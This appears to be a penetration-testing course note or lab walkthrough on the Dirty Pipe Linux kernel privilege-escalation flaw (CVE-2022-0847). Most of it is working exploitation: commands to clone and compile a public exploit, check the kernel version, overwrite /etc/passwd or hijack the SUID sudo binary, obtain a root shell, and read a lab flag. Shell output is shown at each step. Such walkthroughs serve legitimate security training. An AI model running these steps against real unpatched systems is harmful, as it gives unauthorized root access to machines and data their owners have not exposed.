---
description: >-
  based on pipes which are a mechanism of unidirectional communication between
  processes that are particularly popular on Unix systems.
---

# Dirty Pipe

A vulnerability in the Linux kernel, named [Dirty Pipe](https://dirtypipe.cm4all.com/) ([CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847)), allows unauthorized writing to root user files on Linux. Technically, the vulnerability is similar to the [Dirty Cow](https://dirtycow.ninja/) vulnerability discovered in 2016. All kernels from version `5.8` to `5.17` are affected and vulnerable to this vulnerability.

**Download Dirty Pipe Exploit**

```shell-session
cry0l1t3@nix02:~$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cry0l1t3@nix02:~$ cd CVE-2022-0847-DirtyPipe-Exploits
cry0l1t3@nix02:~$ bash compile.sh
```

### exploit version (`exploit-1`)

modifies the `/etc/passwd` and gives us a prompt with root privileges.

**Verify Kernel Version**

```shell-session
cry0l1t3@nix02:~$ uname -r

5.13.0-46-generic
```

**Exploitation**

```shell-session
cry0l1t3@nix02:~$ ./exploit-1

Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)

id

uid=0(root) gid=0(root) groups=0(root)
```

### exploit version (`exploit-2`)

we can execute SUID binaries with root privileges. However, before we can do that, we first need to find these SUID binaries.

```shell-session
cry0l1t3@nix02:~$ find / -perm -4000 2>/dev/null

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/sbin/pppd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/pkexec
/usr/bin/newgrp
```

Then we can choose a binary and specify the full path of the binary as an argument for the exploit and execute it.

**Exploitation**

```shell-session
cry0l1t3@nix02:~$ ./exploit-2 /usr/bin/sudo

[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))

# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),1000(cry0l1t3)
```

## Assessment

It affects the Linux _kernels_ from 5.8 through any _version_ before 5.16.11, 5.15.25 and 5.10.102

```sh
htb-student@ubuntu:~$ find / -perm -4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/su
/usr/bin/at
/usr/bin/chfn
<SNIP>
htb-student@ubuntu:~$ chmod +x exploit-2
htb-student@ubuntu:~$ ./exploit-2 /usr/bin/sudo
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
# id
uid=0(root) gid=0(root) groups=0(root),1000(htb-student)
# bash
root@ubuntu:/home/htb-student# cat /root/flag.txt 
HTB{D1rTy_DiR7Y}
```
